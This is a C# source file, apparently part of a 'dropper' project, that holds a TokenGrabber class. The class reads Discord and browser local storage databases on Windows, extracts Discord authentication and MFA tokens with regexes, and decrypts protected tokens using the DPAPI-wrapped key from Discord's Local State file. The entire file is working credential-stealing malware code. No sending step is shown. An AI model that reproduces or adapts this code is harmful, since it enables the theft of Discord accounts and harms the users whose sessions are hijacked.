using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Linq;
using System.Text;
using System.IO;
using System.Security.Cryptography;

using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Engines;

namespace dropper
{
    public class TokenGrabber
    {
        // #notmycode
        public static string[] GetTokens()
        {
            List<DirectoryInfo> rootFolders = new List<DirectoryInfo>()
            {
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\discord\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\discordptb\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\discordcanary\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\discorddevelopment\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Opera Software\Opera Stable\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Opera Software\Opera GX Stable\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Amigo\User Data\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Torch\User Data\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Kometa\User Data\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Orbitum\User Data\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\CentBrowser\User Data\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\7Star\7Star\User Data\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Sputnik\Sputnik\User Data\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Vivaldi\User Data\Default\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Google\Chrome SxS\User Data\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Epic Privacy Browser\User Data\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\uCozMedia\Uran\User Data\Default\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Opera Software\Opera Neon\User Data\Default\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb")
            };

            List<string> discordTokens = new List<string>();
            foreach (var rootFolder in rootFolders)
            {
                try
                {
                    foreach (var file in rootFolder.GetFiles("*.ldb"))
                    {
                        string readFile = file.OpenText().ReadToEnd();

                        foreach (Match match in Regex.Matches(readFile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                            discordTokens.Add(match.Value);

                        foreach (Match match in Regex.Matches(readFile, @"mfa\.[\w-]{84}"))
                            discordTokens.Add(match.Value);

                        foreach (Match match in Regex.Matches(readFile, "(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)"))
                            discordTokens.Add(DecryptToken(Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1])));
                    }
                }
                catch { continue; }
            }

            return discordTokens.Distinct().ToArray();
        }

        public static string DecryptToken(byte[] buffer)
        {
            byte[] EncryptedData = buffer.Skip(15).ToArray();
            AeadParameters Params = new AeadParameters(new KeyParameter(DecryptKey(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local State")), 128, buffer.Skip(3).Take(12).ToArray(), null);
            GcmBlockCipher BlockCipher = new GcmBlockCipher(new AesEngine());
            BlockCipher.Init(false, Params);
            byte[] DecryptedBytes = new byte[BlockCipher.GetOutputSize(EncryptedData.Length)];
            BlockCipher.DoFinal(DecryptedBytes, BlockCipher.ProcessBytes(EncryptedData, 0, EncryptedData.Length, DecryptedBytes, 0));
            return Encoding.UTF8.GetString(DecryptedBytes).TrimEnd("\r\n\0".ToCharArray());
        }

        public static byte[] DecryptKey(string path)
        {
            dynamic DeserializedFile = JsonConvert.DeserializeObject(File.ReadAllText(path));
            return ProtectedData.Unprotect(Convert.FromBase64String((string)DeserializedFile.os_crypt.encrypted_key).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
        }
    }
}
